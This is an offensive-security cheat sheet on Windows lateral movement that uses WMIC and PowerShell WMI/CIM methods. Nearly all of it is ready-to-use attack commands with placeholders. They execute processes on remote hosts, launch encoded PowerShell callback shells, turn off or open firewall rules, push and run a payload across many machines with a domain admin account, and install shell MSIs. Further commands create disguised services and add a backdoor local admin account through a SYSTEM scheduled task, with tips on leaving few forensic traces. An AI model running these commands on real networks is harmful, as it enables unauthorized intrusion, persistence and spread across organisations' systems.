# Living off the Land

Search Tag(s): #post-exploitation #lateral-movement #living-off-the-land #windows

## 01 - Command Prompt

### 1.1 - Setup

> [!INFO]
> `wmic.exe` has been deprecated in Windows 11. It still exists to most systems to later versions it may not exist. Stick with PowerShell cmdlet is an viable alternative.

Command prompt installation command.

```
C:\> Dism.exe /Online /Add-Capability /CapabilityName:WMIC~~~~​
```

PowerShell installation command.

```
PS C:\> Add-WindowsCapability -Online -Name WMIC~~~~​
```

### 1.2 - Usage

TODO: Consult cybereason blog post to replicate the attacks (refer to the links)

Execute a WMIC with commands remotely (You'll be relying on this a lot and it leaves a little footprint)

```
C:\> where.exe /r C:\ wmic.exe

C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "<commands>"

C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] win32_process call create "C:\path\to\shell.exe"
```

### 1.3 - Use Cases

#### 1.3.1 - Spawn Callback Shells

```
C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "cmd.exe /c <commands>"

C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "C:\path\to\shell.exe"

C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "rundll32 C:\path\to\shell.dll"

C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -v 2 -enc <base64_encoded>"
```

#### 1.3.2 - Firewalls

Disabling firewall rules (not recommended for OPSEC)

```
C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "cmd.exe /c netsh advfirewall set allprofiles state off"
```

Deleting a firewall rule

```
C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "cmd.exe /c netsh advfirewall firewall delete rule name=\"<rule_name>\""
```

Adding firewall rules

```
C:\> wmic.exe /node:<IP> [/user:<username> /password:<password>] process call create "cmd.exe /c netsh advfirewall firewall add rule name=\"<rule_name>\" dir=in action=allow protocol=tcp localport=<port>"
```

#### 1.3.3 - Copy and Execute Payload in Multiple Machines

> [!NOTE] One administrator user account have access to all or most machines
> Use an `Administrator` user or any domain admin account that has access to all or most Windows machines.

```
C:\> wmic.exe /node:@hosts.txt /user:"<domain>\Administrator" /password:"PASSWORD" process call create "cmd.exe /c copy /y \\<IP>\C$\payload.exe %APPDATA%\payload.exe & %APPDATA%\payload.exe"

C:\> wmic.exe /node:@hosts.txt /user:"<domain>\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer Updater \\<IP>\C$\payload.exe %APPDATA%\payload.exe & %APPDATA%\payload.exe"
```

## 02 - PowerShell

### 2.1 - Usage

#### 2.1.1 - Invoke-WmiMethod

```
PS C:\> Get-CimInstance -ClassName Win32_Net* -List

PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "<commands>"
```

The `Win32_Process` class contains a static method named create that can spawn a process locally or remotely. This is the WMI equivalent of running psexec.exe only without unnecessary forensic artifacts like the creation of a service. The following example demonstrates executing a process on a remote machine:

```
PS C:\> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'notepad.exe' -ComputerName <IP> -Credential '<DOMAIN>\<username>'
```

#### 2.1.2 - Invoke-CimMethod

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"
}
```

### 2.2 - Use Cases

#### 2.2.1 - Spawn Callback Shells

##### 2.2.1.1 - Download Cradle

Using `Invoke-WmiMethod` one-liner.

```powershell
PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "powershell -E <base64_encoded>"
```

```powershell
PS C:\> $servicetype = [byte] 16
$errorcontrol = [byte] 1
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false, "Windows Performance", $errorcontrol, $null,$null,"WinPerf","c:\windows\System32\cmd.exe /c powershell -e <base64_encoded>",$null,$servicetype,"Manual","NT AUHORITY\SYSTEM","" -ComputerName <IP> -Credential <domain>\Administrator
```

Using `Invoke-CimMethod` one-liner.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = $Command
}
```

##### 2.2.1.2 - MSI Package

Using `Invoke-CimMethod` one-liner.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
	PackageLocation = "C:\path\to\shell.msi";
	Options = "";
	AllUsers = $false
}
```

#### 2.2.2 - Create Service

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
	Name = "UpdateSVC";
	DisplayName = "UpdateSVC";
	Pathname = "C:\path\to\shellsvc.exe";
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess
	StartMode = "<Manual | Auto>"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name LIKE 'UpdateSVC'"
```

Start the service

```
PS C:\> Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop the service

```
PS C:\> Invoke-CimMethod -InputObject $Service -MethodName StopService
```

Delete service

```
PS C:\> Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### 2.2.3 - Schedule Tasks

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "cmd.exe"

$Args = "/c net user <username> <password> /add & net localgroup `"<local_group>`" <username> /add /y"

# Create new schedule task

$Action = New-ScheduleTaskAction -CimSession $Session -Execute $Command $Argument $Args

Register-ScheduleTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<schedule_taskname>"

# Execute schedule task

Start-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"

# Delete schedule task

Unregister-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"
```

---
## References

### LOFLCAB

- [LOFLCAB: WMIC](https://lofl-project.github.io/loflcab/Binaries/wmic/)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### Hacking Articles

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

### Mandiant

- [Mandiant: Windows Management Instrumentation](https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf)

### Varonis

- [Varonis: Windows Management Instrumentation (WMI) Guide - Understanding WMI Attacks](https://www.varonis.com/blog/wmi-windows-management-instrumentation)

### Cybereason

- [Cybereason: No Win32 Process Needed | Expanding the WMI Lateral Movement Arsenal](https://www.cybereason.com/blog/wmi-lateral-movement-win32)